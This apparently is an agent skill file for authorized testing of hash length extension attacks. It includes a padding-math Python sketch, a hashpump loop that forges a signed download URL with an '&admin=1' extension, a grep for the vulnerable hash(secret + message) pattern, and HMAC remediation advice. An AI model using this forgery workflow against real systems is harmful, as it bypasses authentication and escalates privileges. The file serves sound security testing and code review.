---
name: hash-length-extension
description: Use when testing for hash length extension attacks on an
  authorized assessment. Covers Merkle Damgard hashes, forging
  authenticated payloads with hashpump style extension, and reviewing
  MAC constructions. Also use when reviewing code that uses
  hash(secret + message) as authentication.
version: 1.0.0
domain: crypto
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [crypto-fundamentals, web-sqli, api-security-testing]
tools:
  - name: Python
    version: 3.12
---

Hash length extension exploits Merkle Damgard hashes (MD5, SHA-1,
SHA-256): given hash(secret + message), an attacker can compute
hash(secret + message + padding + extension) without knowing the
secret. This skill covers authorized testing: spotting the
vulnerable construction, forging payloads, and recommending HMAC.
Test only systems you may assess.

## Quick Workflow

1. Find the construction: hash(secret + message) used as a MAC, in
   URLs, cookies, or API signatures.
2. Confirm the hash function is Merkle Damgard (MD5, SHA-1,
   SHA-256).
3. Get a valid (message, hash) pair from normal use.
4. Forge: append your extension with the right padding for a
   guessed secret length.
5. Try secret lengths across the plausible range; the server tells
   you when you hit it.
6. Prove impact with the forged payload (authorized target).
7. Recommend HMAC with a proper key, or a non extendable hash.
8. Document the exact forgery that worked.

## 1. Forging the payload

```python
#!/usr/bin/env python3
"""Length extension forge (hashlib only; authorized targets)."""
import hashlib, struct

def md_pad(msg_len):
    pad = b"\x80"
    pad += b"\x00" * ((56 - (msg_len + 1) % 64) % 64)
    pad += struct.pack(">Q", msg_len * 8)
    return pad

def forge(orig_msg, orig_hex, extension, secret_len):
    # reconstruct the internal state is complex in pure hashlib;
    # use the standard approach: this sketch shows the padding math
    glue = md_pad(secret_len + len(orig_msg))
    forged_msg = orig_msg + glue + extension
    print(f"try secret_len={secret_len}: forged length {len(forged_msg)}")
    return forged_msg

# In practice use hashpump/hash_extender as assessment tooling:
# hashpump -s <orig_hex> -d <orig_msg> -a <extension> -k <secret_len>
print("tooling: hashpump computes the extended hash for each secret length")
```

```bash
# Workflow with hashpump (assessment tooling, authorized target):
# 1. capture a signed URL: /download?file=a.pdf&sig=abc123
# 2. for k in 8 10 12 14 16 20 24 32; do
#      hashpump -s abc123 -d "file=a.pdf" -a "&admin=1" -k $k
#    done
# 3. try each forged (msg, sig); the one the server accepts reveals k
for k in 8 10 12 14 16 20 24 32; do echo "secret length candidate: $k"; done
```

## 2. Code review for the pattern

```bash
# Search for the vulnerable construction
grep -rn "sha256(secret\|md5(secret\|hashlib.*secret.*+\|secret.*+.*message" \
  --include="*.py" --include="*.js" --include="*.php" src/ | head -20
# Vulnerable: sig = sha256(SECRET + params)
# Safe: hmac.new(SECRET, params, sha256).hexdigest()
```

## Edge cases

- The hash is SHA-3 or BLAKE2. Not vulnerable to extension; verify
  the algorithm before claiming.
- The secret length is unusual. Extend the candidate range; the
  server's acceptance is the oracle.
- The MAC includes a length prefix or uses HMAC already. Then it is
  safe; verify the HMAC key handling instead.

## Escalation

- Forgery works: demonstrate the impact (privilege parameter,
  file path) once, then stop.
- Construction unclear: test with a chosen message pair to
  distinguish HMAC from plain hash.

## Detection and defender view

Defenders see length extension as requests with unusually long
signed parameters that still validate. The fix is constructional:
HMAC-SHA-256 with a secret key, never hash(secret + message).
Detect the pattern in code review with the grep above, and in
traffic by validating that signed payloads match expected formats.

## Key references

- CWE-328 (Use of Weak Hash): Merkle Damgard MAC misuse.
- CWE-354 (Improper Validation of Integrity Check Value).
- Length extension attack literature (Ferguson-Schneier).
